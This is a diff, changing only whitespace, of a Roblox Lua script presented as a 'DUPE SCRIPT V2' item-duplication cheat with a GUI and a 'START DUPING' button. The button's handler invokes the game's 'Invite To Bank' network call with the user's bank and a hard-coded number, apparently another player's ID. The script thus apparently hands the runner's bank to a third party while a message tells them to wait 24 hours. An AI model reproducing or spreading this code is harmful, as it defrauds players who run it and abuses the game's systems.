@@ -1,5 +1,5 @@
 --- Made By: Dupinglegends1
- 
+
 local DupeGui = Instance.new("ScreenGui")
 local Frame = Instance.new("ImageLabel")
 local TextLabel = Instance.new("TextLabel")
@@ -7,13 +7,13 @@ local TextLabel_2 = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
 local Frame_2 = Instance.new("ImageLabel")
 local Start = Instance.new("TextButton")
- 
+
 --Properties:
- 
+
 DupeGui.Name = "DupeGui"
 DupeGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 DupeGui.ResetOnSpawn = false
- 
+
 Frame.Name = "Frame"
 Frame.Parent = DupeGui
 Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -28,7 +28,7 @@ Frame.SliceCenter = Rect.new(100, 100, 100, 100)
 Frame.SliceScale = 0.100
 Frame.Active = true
 Frame.Draggable = true
- 
+
 TextLabel.Parent = Frame
 TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.BackgroundTransparency = 1.000
@@ -39,7 +39,7 @@ TextLabel.Font = Enum.Font.SourceSansBold
 TextLabel.Text = "If the dupe is successful, wait 24 hours before opening\\n"
 TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 TextLabel.TextSize = 15.000
- 
+
 TextLabel_2.Parent = Frame
 TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.BackgroundTransparency = 0.800
@@ -50,7 +50,7 @@ TextLabel_2.Font = Enum.Font.SourceSansBold
 TextLabel_2.Text = "DUPE SCRIPT V2"
 TextLabel_2.TextColor3 = Color3.fromRGB(0, 85, 255)
 TextLabel_2.TextSize = 40.000
- 
+
 TextLabel_3.Parent = Frame
 TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_3.BackgroundTransparency = 1.000
@@ -61,7 +61,7 @@ TextLabel_3.Font = Enum.Font.Creepster
 TextLabel_3.Text = "Press Me To Star Duping"
 TextLabel_3.TextColor3 = Color3.fromRGB(51, 255, 92)
 TextLabel_3.TextSize = 25.000
- 
+
 Frame_2.Name = "Frame"
 Frame_2.Parent = Frame
 Frame_2.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
@@ -74,7 +74,7 @@ Frame_2.ImageColor3 = Color3.fromRGB(0, 85, 255)
 Frame_2.ScaleType = Enum.ScaleType.Slice
 Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
 Frame_2.SliceScale = 0.050
- 
+
 Start.Name = "Start"
 Start.Parent = Frame_2
 Start.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -86,12 +86,12 @@ Start.LineHeight = 0.750
 Start.Text = "START DUPING"
 Start.TextColor3 = Color3.fromRGB(30, 207, 36)
 Start.TextSize = 20.000
- 
+
 -- Scripts:
- 
+
 local function IUHI_fake_script() -- TextLabel_2.Script 
 	local script = Instance.new('Script', TextLabel_2)
- 
+
 	--text color change script by dizzywig2000
 	wait()
 	while true do 
@@ -118,7 +118,7 @@ end
 coroutine.wrap(IUHI_fake_script)()
 local function PREXT_fake_script() -- TextLabel_3.Changing text 
 	local script = Instance.new('Script', TextLabel_3)
- 
+
 	while true do
 	script.Parent.Text = "P"
 	wait(.5)
@@ -169,7 +169,7 @@ end
 coroutine.wrap(PREXT_fake_script)()
 local function LPNFV_fake_script() -- DupeGui.Script 
 	local script = Instance.new('Script', DupeGui)
- 
+
 	Start.MouseButton1Down:connect(function()
 local dupeKey = 3465522766
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
@@ -194,7 +194,7 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
 else
     lib.Message.New("Dupe failure :frowning: please try again");
 end;
- 
+
 	end)
 end
 coroutine.wrap(LPNFV_fake_script)()
